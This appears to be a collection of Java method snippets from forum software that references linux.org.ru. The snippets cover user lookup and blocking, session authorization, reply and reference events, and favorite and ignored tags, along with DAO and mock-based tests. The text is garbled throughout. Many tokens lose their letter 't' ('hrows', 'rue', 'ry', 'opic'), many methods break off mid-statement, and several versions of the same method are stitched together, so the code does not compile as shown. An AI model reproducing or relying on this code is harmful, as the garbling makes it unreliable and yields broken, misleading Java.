private static String getNoCacheLinkToProfile ( User user ) hrows UnsupportedEncodingException { Random random = new Random ( ) ; return " /people/ " + URLEncoder . encode ( user . getNick ( ) , " UTF-8 " ) + " /profile?nocache= " + random . nextInt ( ) ; } 
public View getInfo ( @RequestParam ( " nick " ) String nick ) hrows UnsupportedEncodingException { return new RedirectView ( " /people/ " + URLEncoder . encode ( nick , " UTF-8 " ) + " /profile " ) ; } 
public void estUrlEncode ( ) hrows Exception { assertEquals ( User . EMPTY_GRAVATAR_SECURE_URL , URLEncoder . encode ( " https:www.linux.org.ru/img/p.gif " , " UTF-8 " ) ) ; assertEquals ( User . EMPTY_GRAVATAR_URL , URLEncoder . encode ( " http:www.linux.org.ru/img/p.gif " , " UTF-8 " ) ) ; } 
public boolean canUseTags ( Group group , User user ) { if ( group . isModerated ( ) ) { return rue ; } return user ! = null & & user . getScore ( ) > = 100 ; } 
public boolean canUseTags ( Group group , User user ) { return rue ; TODO: inline after 2 april 2012 } 
public User getUser ( String nick ) hrows UserNotFoundException { if ( nick = = null ) { hrow new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { hrow new UserNotFoundException ( " <invalid name> " ) ; } List < Integer > list = jdbcTemplate . queryForList ( queryUserIdByNick , Integer . class , nick ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } return getUser ( list . get ( 0 ) ) ; } 
public User getUserCached ( int id ) hrows UserNotFoundException { return getUserInternal ( id ) ; } 
public User getUser ( int id ) hrows UserNotFoundException { return getUserInternal ( id ) ; } 
private User getUserInternal ( int id ) hrows UserNotFoundException { List < User > list = jdbcTemplate . query ( queryUserById , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new User ( rs ) ; } } , id ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } return list . get ( 0 ) ; } 
public User mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new User ( rs ) ; } 
public void changeScore ( int id , int delta ) { if ( jdbcTemplate . update ( queryChangeScore , delta , id ) = = 0 ) { hrow new IllegalArgumentException ( new UserNotFoundException ( id ) ) ; 
public void blockWithoutTransaction ( User user , User moderator , String reason ) { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; 
public void blockWithResetPassword ( User user , User moderator , String reason ) { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String password = encryptor . encryptPassword ( StringUtil . generatePassword ( ) ) ; jdbcTemplate . update ( " UPDATE users SET passwd=?, lostpwd = 'epoch' WHERE id=? " , password , user . getId ( ) ) ; 
public boolean isSessionAuthorized ( ) { return isSessionAuthorized ( session ) & & currentUser ! = null ; } 
private static boolean isSessionAuthorized ( HttpSession session ) { return session ! = null & & session . getAttribute ( " login " ) ! = null & & ( Boolean ) session . getAttribute ( " login " ) ; } 
public boolean isModeratorSession ( ) { if ( ! isSessionAuthorized ( ) ) { return false ; } return currentUser . isModerator ( ) ; } 
public boolean isCorrectorSession ( ) { if ( ! isSessionAuthorized ( ) ) { return false ; } return currentUser . isCorrector ( ) ; } 
private void initCurrentUser ( UserDao userDao , boolean forceUpdate ) { if ( ! isSessionAuthorized ( session ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } ry { currentUser = userDao . getUser ( ( String ) session . getAttribute ( " nick " ) ) ; 
public List < TrackerItem > getTrackAll ( TrackerFilter filter , User currentUser , Timestamp interval , int opics , int offset , final int messagesInPage ) { MapSqlParameterSource parameter = new MapSqlParameterSource ( ) ; parameter . addValue ( " interval " , interval ) ; parameter . addValue ( " opics " , opics ) ; parameter . addValue ( " offset " , offset ) ; String partIgnored ; if ( currentUser ! = null ) { partIgnored = queryPartIgnored ; parameter . addValue ( " userid " , currentUser . getId ( ) ) ; } else { partIgnored = " " ; } String partFilter ; String partWiki = queryPartWiki ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case TECH : partFilter = queryPartTech ; break ; case MINE : if ( currentUser ! = null ) { partFilter = queryPartMine ; partWiki = queryPartWikiMine ; } else { partFilter = " " ; } break ; default : partFilter = " " ; } String query ; if ( filter ! = TrackerFilter . ZERO ) { query = String . format ( queryTrackerMain , partIgnored , partFilter , partIgnored , partFilter , partWiki ) ; } else { query = String . format ( queryTrackerZeroMain , partIgnored ) ; } return jdbcTemplate . query ( query , parameter , new RowMapper < TrackerItem > ( ) { @Override 
public void creanEvents ( ) { userEventsDao . cleanupOldEvents ( MAX_EVENTS ) ; } 
public void resetUnreadReplies ( User user ) { jdbcTemplate . update ( UPDATE_RESET_UNREAD_REPLIES , user . getId ( ) ) ; jdbcTemplate . update ( " UPDATE user_events SET unread=false WHERE userid=? " , user . getId ( ) ) ; } 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int opics , int offset , UserEventFilterEnum eventFilter ) { String queryString ; if ( showPrivate ) { String queryPart ; switch ( eventFilter ) { case FAVORITES : queryPart = queryPartFilterFavorites ; break ; case ANSWERS : queryPart = queryPartFilterAnswers ; break ; case DELETED : queryPart = queryPartFilterDeleted ; break ; case REFERENCE : queryPart = queryPartFilterReference ; break ; default : queryPart = " " ; } queryString = String . format ( queryAllRepliesForUser , queryPart ) ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < UserEvent > ( ) { @Override 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int opics , int offset , UserEventFilterEnum eventFilter ) { String queryString ; if ( showPrivate ) { String queryPart = " " ; if ( eventFilter ! = UserEventFilterEnum . ALL ) queryPart = " AND type = ' " + eventFilter . getType ( ) + " ' " ; queryString = String . format ( queryAllRepliesForUser , queryPart ) ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < UserEvent > ( ) { @Override 
public UserEvent mapRow ( ResultSet resultSet , int i ) hrows SQLException { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; if ( lastmod = = null ) { lastmod = new Timestamp ( 0 ) ; } Timestamp eventDate = resultSet . getTimestamp ( " event_date " ) ; int cid = resultSet . getInt ( " cid " ) ; int cAuthor ; Timestamp cDate ; if ( ! resultSet . wasNull ( ) ) { cAuthor = resultSet . getInt ( " cAuthor " ) ; cDate = resultSet . getTimestamp ( " cDate " ) ; } else { cDate = null ; cAuthor = 0 ; } String groupTitle = resultSet . getString ( " gtitle " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; int sectionId = resultSet . getInt ( " section " ) ; int msgid = resultSet . getInt ( " msgid " ) ; UserEventFilterEnum ype = UserEventFilterEnum . valueOfByType ( resultSet . getString ( " ype " ) ) ; String eventMessage = resultSet . getString ( " ev_msg " ) ; boolean unread = resultSet . getBoolean ( " unread " ) ; return new UserEvent ( cid , cAuthor , cDate , groupTitle , groupUrlName , sectionId , subj , lastmod , msgid , ype , eventMessage , eventDate , unread ) ; 
public void addUserRefEvent ( User [ ] refs , int opic , int comment ) { if ( refs . length = = 0 ) { return ; } Map < String , Object > [ ] batch = new Map [ refs . length ] ; for ( int i = 0 ; i < refs . length ; i + + ) { User ref = refs [ i ] ; batch [ i ] = ImmutableMap . < String , Object > of ( " userid " , ref . getId ( ) , " ype " , UserEventFilterEnum . REFERENCE . getType ( ) , " private " , false , " message_id " , opic , " comment_id " , comment ) ; } insert . executeBatch ( batch ) ; } 
public void addUserRefEvent ( User [ ] refs , int opic ) { if ( refs . length = = 0 ) { return ; } Map < String , Object > [ ] batch = new Map [ refs . length ] ; for ( int i = 0 ; i < refs . length ; i + + ) { User ref = refs [ i ] ; batch [ i ] = ImmutableMap . < String , Object > of ( " userid " , ref . getId ( ) , " ype " , UserEventFilterEnum . REFERENCE . getType ( ) , " private " , false , " message_id " , opic ) ; } insert . executeBatch ( batch ) ; } 
public void addReplyEvent ( User parentAuthor , int opicId , int commentId ) { insert . execute ( ImmutableMap . < String , Object > of ( " userid " , parentAuthor . getId ( ) , 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int opics , int offset , UserEventFilterEnum eventFilter ) { String queryString ; if ( showPrivate ) { String queryPart = " " ; if ( eventFilter ! = UserEventFilterEnum . ALL ) queryPart = " AND type = ' " + eventFilter . getType ( ) + " ' " ; queryString = String . format ( QUERY_ALL_REPLIES_FOR_USER , queryPart ) ; } else { queryString = QUERY_REPLIES_FOR_USER_WIHOUT_PRIVATE ; } return jdbcTemplate . query ( queryString , new RowMapper < UserEvent > ( ) { @Override 
public UserEvent mapRow ( ResultSet resultSet , int i ) hrows SQLException { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; if ( lastmod = = null ) { lastmod = new Timestamp ( 0 ) ; } Timestamp eventDate = resultSet . getTimestamp ( " event_date " ) ; int cid = resultSet . getInt ( " cid " ) ; int cAuthor ; Timestamp cDate ; if ( ! resultSet . wasNull ( ) ) { cAuthor = resultSet . getInt ( " cAuthor " ) ; cDate = resultSet . getTimestamp ( " cDate " ) ; } else { cDate = null ; cAuthor = 0 ; } String groupTitle = resultSet . getString ( " gtitle " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; int sectionId = resultSet . getInt ( " section " ) ; int msgid = resultSet . getInt ( " msgid " ) ; UserEventFilterEnum ype = UserEventFilterEnum . valueOfByType ( resultSet . getString ( " ype " ) ) ; String eventMessage = resultSet . getString ( " ev_msg " ) ; boolean unread = resultSet . getBoolean ( " unread " ) ; return new UserEvent ( cid , cAuthor , cDate , groupTitle , groupUrlName , sectionId , subj , lastmod , msgid , ype , eventMessage , eventDate , unread ) ; 
public void creanEvents ( ) { userEventDao . cleanupOldEvents ( MAX_EVENTS ) ; } 
public void creanEvents ( ) { userEventService . cleanupOldEvents ( MAX_EVENTS ) ; } 
public void addEvent ( String eventType , int userId , boolean isPrivate , Integer opicId , Integer commentId , String message ) { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " userid " , userId ) ; params . put ( " ype " , eventType ) ; params . put ( " private " , isPrivate ) ; if ( opicId ! = null ) { params . put ( " message_id " , opicId ) ; } if ( commentId ! = null ) { params . put ( " comment_id " , commentId ) ; } if ( message ! = null ) { params . put ( " message " , message ) ; } insert . execute ( params ) ; } 
public void resetUnreadReplies ( int userId ) { jdbcTemplate . update ( UPDATE_RESET_UNREAD_REPLIES , userId ) ; jdbcTemplate . update ( " UPDATE user_events SET unread=false WHERE userid=? " , userId ) ; } 
public void cleanupOldEvents ( int userId , int maxEventsPerUser ) { jdbcTemplate . update ( " DELETE FROM user_events WHERE user_events.id IN (SELECT id FROM user_events WHERE userid=? ORDER BY event_date DESC OFFSET ?) " , 
public List < UserEvent > getRepliesForUser ( int userId , boolean showPrivate , int opics , int offset , String eventFilterType ) { String queryString ; if ( showPrivate ) { String queryPart = " " ; if ( eventFilterType ! = null ) { queryPart = " AND type = ' " + eventFilterType + " ' " ; } queryString = String . format ( QUERY_ALL_REPLIES_FOR_USER , queryPart ) ; } else { queryString = QUERY_REPLIES_FOR_USER_WIHOUT_PRIVATE ; } return jdbcTemplate . query ( queryString , new RowMapper < UserEvent > ( ) { @Override 
public void addUserRefEvent ( User [ ] users , int opicId , int commentId ) { for ( User user : users ) { userEventDao . addEvent ( 
public void addUserRefEvent ( User [ ] users , int opicId ) { for ( User user : users ) { userEventDao . addEvent ( 
public void addReplyEvent ( User parentAuthor , int opicId , int commentId ) { userEventDao . addEvent ( UserEventFilterEnum . ANSWERS . getType ( ) , 
public void cleanupOldEvents ( final int maxEventsPerUser ) { List < Integer > oldEventsList = userEventDao . getUserIdListByOldEvents ( maxEventsPerUser ) ; for ( int userId : oldEventsList ) { logger . info ( " Cleaning up messages for userid= " + userId ) ; 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int opics , int offset , UserEventFilterEnum eventFilter ) { String eventFilterType = null ; if ( eventFilter ! = UserEventFilterEnum . ALL ) { eventFilterType = eventFilter . getType ( ) ; } return userEventDao . getRepliesForUser ( user . getId ( ) , showPrivate , opics , offset , eventFilterType ) ; } 
public void resetUnreadReplies ( User user ) { userEventDao . resetUnreadReplies ( user . getId ( ) ) ; } 
public ModelAndView showList ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; return modelAndView ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userDao . getUser ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public void addTag ( int userId , int agId , boolean isFavorite ) { jdbcTemplate . update ( " INSERT INTO user_tags (user_id, tag_id, is_favorite) VALUES(?,?,?) " , 
public void deleteTag ( int userId , int agId , boolean isFavorite ) { jdbcTemplate . update ( " DELETE FROM user_tags WHERE user_id=? and tag_id=? and is_favorite=? " , 
public void deleteTags ( int agId ) { jdbcTemplate . update ( " DELETE FROM user_tags WHERE tag_id=? " , agId ) ; } 
public UserTagDao getUserTagDao ( ) hrows Exception { UserTagDao userTagDao = mock ( UserTagDao . class ) ; return userTagDao ; } 
private int createUser ( String userName ) { int userid = jdbcTemplate . queryForInt ( " SELECT nextval('s_uid') AS userid " ) ; jdbcTemplate . update ( " INSERT INTO users (id, name, nick) VALUES (?, ?, ?) " , userid , userName , userName ) ; return userid ; } 
private int createTag ( String agName ) { jdbcTemplate . update ( " INSERT INTO tags_values (value) VALUES (?) " , agName ) ; return jdbcTemplate . queryForInt ( " SELECT currval('tags_values_id_seq') AS tagid " ) ; } 
public void prepareTestData ( ) { cleanupTestData ( ) ; user1Id = createUser ( " UserTagDaoIntegrationTest_user1 " ) ; user2Id = createUser ( " UserTagDaoIntegrationTest_user2 " ) ; ag1Id = createTag ( " UserTagDaoIntegrationTest_tag1 " ) ; ag2Id = createTag ( " UserTagDaoIntegrationTest_tag2 " ) ; ag3Id = createTag ( " UserTagDaoIntegrationTest_tag3 " ) ; ag4Id = createTag ( " UserTagDaoIntegrationTest_tag4 " ) ; ag5Id = createTag ( " UserTagDaoIntegrationTest_tag5 " ) ; } 
public void cleanupTestData ( ) { jdbcTemplate . update ( " DELETE FROM user_TAGS WHERE user_id in ( " + user1Id + " , " + user2Id + " ) " ) ; jdbcTemplate . update ( " DELETE FROM users WHERE nick LIKE 'UserTagDaoIntegrationTest_user%' " ) ; jdbcTemplate . update ( " DELETE FROM tags_values WHERE value LIKE 'UserTagDaoIntegrationTest_tag%' " 
private void prepareUserTags ( ) { userTagDao . addTag ( user1Id , ag1Id , rue ) ; userTagDao . addTag ( user2Id , ag1Id , rue ) ; userTagDao . addTag ( user1Id , ag2Id , rue ) ; userTagDao . addTag ( user1Id , ag2Id , false ) ; userTagDao . addTag ( user2Id , ag2Id , rue ) ; userTagDao . addTag ( user2Id , ag3Id , rue ) ; userTagDao . addTag ( user1Id , ag3Id , rue ) ; userTagDao . addTag ( user2Id , ag4Id , rue ) ; userTagDao . addTag ( user1Id , ag4Id , rue ) ; userTagDao . addTag ( user1Id , ag5Id , false ) ; userTagDao . addTag ( user2Id , ag5Id , rue ) ; userTagDao . addTag ( user1Id , ag5Id , rue ) ; } 
public void addTest ( ) { prepareUserTags ( ) ; ry { userTagDao . addTag ( user1Id , ag1Id , rue ) ; Assert . fail ( " Duplicate key check fail! " ) ; } catch ( DuplicateKeyException ignored ) { } userTagDao . addTag ( user1Id , ag1Id , false ) ; ry { userTagDao . addTag ( user1Id , ag1Id , false ) ; Assert . fail ( " Duplicate key check fail! " ) ; } catch ( DuplicateKeyException ignored ) { } int result ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=true AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=false AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=true AND user_id=? " , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=false AND user_id=? " , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 0 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , ag1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void deleteOneTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTag ( user1Id , ag1Id , rue ) ; userTagDao . deleteTag ( user1Id , ag2Id , rue ) ; int result ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=true AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; userTagDao . deleteTag ( user1Id , ag2Id , false ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=true AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=false AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 1 , result ) ; } 
public void deleteAllTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTags ( ag2Id ) ; int result ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=true AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 4 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=false AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 1 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=true AND user_id=? " , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 4 , result ) ; } 
public int addToMemories ( int userid , int opic ) { List < Integer > res = jdbcTemplate . queryForList ( " SELECT id FROM memories WHERE userid=? AND topic=? FOR UPDATE " , Integer . class , userid , opic ) ; if ( res . isEmpty ( ) ) { return insertTemplate . executeAndReturnKey ( ImmutableMap . < String , Object > of ( " userid " , userid , " opic " , opic ) ) . intValue ( ) ; 
public ModelAndView showList ( HttpServletRequest request ) hrows AccessViolationException , UserNotFoundException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; return modelAndView ; } 
private Map < Integer , User > createIgnoreMap ( Set < Integer > ignoreList ) hrows UserNotFoundException { Map < Integer , User > ignoreMap = new HashMap < Integer , User > ( ignoreList . size ( ) ) ; for ( int id : ignoreList ) { ignoreMap . put ( id , userDao . getUserCached ( id ) ) ; } return ignoreMap ; } 
public ModelAndView favoriteTagDel ( ServletRequest request , @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . favoriteDel ( user , agName ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public ModelAndView ignoreTagDel ( ServletRequest request , @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . ignoreDel ( user , agName ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public void favoriteAdd ( User user , String agName ) hrows TagNotFoundException { int agId = agDao . getTagIdByName ( agName ) ; userTagDao . addTag ( user . getId ( ) , agId , rue ) ; } 
public void favoriteDel ( User user , String agName ) hrows TagNotFoundException { int agId = agDao . getTagIdByName ( agName ) ; userTagDao . deleteTag ( user . getId ( ) , agId , rue ) ; } 
public void ignoreAdd ( User user , String agName ) hrows TagNotFoundException { int agId = agDao . getTagIdByName ( agName ) ; userTagDao . addTag ( user . getId ( ) , agId , false ) ; } 
public void ignoreDel ( User user , String agName ) hrows TagNotFoundException { int agId = agDao . getTagIdByName ( agName ) ; userTagDao . deleteTag ( user . getId ( ) , agId , false ) ; } 
public ImmutableList < String > favoritesGet ( User user ) { return userTagDao . getTags ( user . getId ( ) , rue ) ; } 
public ImmutableList < String > ignoresGet ( User user ) { return userTagDao . getTags ( user . getId ( ) , false ) ; } 
public void resetMockObjects ( ) hrows Exception { reset ( userTagDao ) ; reset ( agDao ) ; when ( agDao . getTagIdByName ( " ag1 " ) ) . henReturn ( 2 ) ; user = getUser ( 1 ) ; } 
public void favoriteAddTest ( ) hrows TagNotFoundException { when ( agDao . getTagIdByName ( " ag1 " ) ) . henReturn ( 2 ) ; userTagService . favoriteAdd ( user , " ag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( rue ) ) ; } 
public void favoriteDelTest ( ) hrows TagNotFoundException { userTagService . favoriteDel ( user , " ag1 " ) ; verify ( userTagDao ) . deleteTag ( eq ( 1 ) , eq ( 2 ) , eq ( rue ) ) ; } 
public void ignoreAddTest ( ) hrows TagNotFoundException { userTagService . ignoreAdd ( user , " ag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( false ) ) ; } 
public void ignoreDelTest ( ) hrows TagNotFoundException { userTagService . ignoreDel ( user , " ag1 " ) ; verify ( userTagDao ) . deleteTag ( eq ( 1 ) , eq ( 2 ) , eq ( false ) ) ; } 
public void favoritesGetTest ( ) { ImmutableList . Builder < String > etalonBuild = ImmutableList . builder ( ) ; etalonBuild . add ( " ag1 " ) ; ImmutableList < String > etalon = etalonBuild . build ( ) ; when ( userTagDao . getTags ( 1 , rue ) ) . henReturn ( etalon ) ; ImmutableList < String > actual = userTagService . favoritesGet ( user ) ; Assert . assertEquals ( etalon . size ( ) , actual . size ( ) ) ; Assert . assertEquals ( etalon . get ( 0 ) , actual . get ( 0 ) ) ; } 
public void ignoresGetTest ( ) { ImmutableList . Builder < String > etalonBuild = ImmutableList . builder ( ) ; etalonBuild . add ( " ag1 " ) ; ImmutableList < String > etalon = etalonBuild . build ( ) ; when ( userTagDao . getTags ( 1 , false ) ) . henReturn ( etalon ) ; ImmutableList < String > actual = userTagService . ignoresGet ( user ) ; Assert . assertEquals ( etalon . size ( ) , actual . size ( ) ) ; Assert . assertEquals ( etalon . get ( 0 ) , actual . get ( 0 ) ) ; } 
public UserTagDao getUserTagDao ( ) hrows Exception { UserTagDao userTagDao = mock ( UserTagDao . class ) ; return userTagDao ; } 
public TagDao getTagDao ( ) hrows Exception { TagDao agDao = mock ( TagDao . class ) ; return agDao ; } 
public void addUserTagEvent ( List < Integer > userIdList , int opicId ) { for ( Integer userId : userIdList ) { userEventDao . addEvent ( 
public void addTag ( int userId , int agId , boolean isFavorite ) { MapSqlParameterSource parameters = new MapSqlParameterSource ( ) ; parameters . addValue ( " user_id " , userId ) ; parameters . addValue ( " ag_id " , agId ) ; parameters . addValue ( " is_favorite " , isFavorite ) ; jdbcTemplate . update ( " INSERT INTO user_tags (user_id, tag_id, is_favorite) VALUES(:user_id, :tag_id, :is_favorite) " , 
public void deleteTag ( int userId , int agId , boolean isFavorite ) { MapSqlParameterSource parameters = new MapSqlParameterSource ( ) ; parameters . addValue ( " user_id " , userId ) ; parameters . addValue ( " ag_id " , agId ) ; parameters . addValue ( " is_favorite " , isFavorite ) ; jdbcTemplate . update ( " DELETE FROM user_tags WHERE user_id=:user_id and tag_id=:tag_id and is_favorite=:is_favorite " , 
public void deleteTags ( int agId ) { MapSqlParameterSource parameters = new MapSqlParameterSource ( ) ; parameters . addValue ( " ag_id " , agId ) ; jdbcTemplate . update ( " DELETE FROM user_tags WHERE tag_id=:tag_id " , parameters ) ; } 
public List < Integer > getUserIdListByTags ( List < String > ags ) { return userTagDao . getUserIdListByTags ( ags ) ; } 
public List < TrackerItem > getTrackAll ( TrackerFilter filter , User currentUser , Timestamp interval , int opics , int offset , final int messagesInPage ) { MapSqlParameterSource parameter = new MapSqlParameterSource ( ) ; parameter . addValue ( " interval " , interval ) ; parameter . addValue ( " opics " , opics ) ; parameter . addValue ( " offset " , offset ) ; String partIgnored ; if ( currentUser ! = null ) { partIgnored = queryPartIgnored + queryPartTagIgnored ; parameter . addValue ( " userid " , currentUser . getId ( ) ) ; } else { partIgnored = " " ; } String partFilter ; String partWiki = queryPartWiki ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case TECH : partFilter = queryPartTech ; break ; case MINE : if ( currentUser ! = null ) { partFilter = queryPartMine ; partWiki = queryPartWikiMine ; } else { partFilter = " " ; } break ; default : partFilter = " " ; } String query ; if ( filter ! = TrackerFilter . ZERO ) { query = String . format ( queryTrackerMain , partIgnored , partFilter , partIgnored , partFilter , partWiki ) ; } else { query = String . format ( queryTrackerZeroMain , partIgnored ) ; } return jdbcTemplate . query ( query , parameter , new RowMapper < TrackerItem > ( ) { @Override 
public ModelAndView showList ( HttpServletRequest request ) hrows AccessViolationException , UserNotFoundException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } return modelAndView ; } 
public void replaceTag ( int oldTagId , int newTagId ) { MapSqlParameterSource parameters = new MapSqlParameterSource ( ) ; parameters . addValue ( " new_tag_id " , newTagId ) ; parameters . addValue ( " old_tag_id " , oldTagId ) ; jdbcTemplate . update ( " UPDATE user_tags SET tag_id=:new_tag_id WHERE tag_id=:old_tag_id " + 
public void addTest ( ) { prepareUserTags ( ) ; ry { userTagDao . addTag ( user1Id , ag1Id , rue ) ; Assert . fail ( " Duplicate key check fail! " ) ; } catch ( DuplicateKeyException ignored ) { } userTagDao . addTag ( user1Id , ag1Id , false ) ; ry { userTagDao . addTag ( user1Id , ag1Id , false ) ; Assert . fail ( " Duplicate key check fail! " ) ; } catch ( DuplicateKeyException ignored ) { } int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 0 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , ag1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
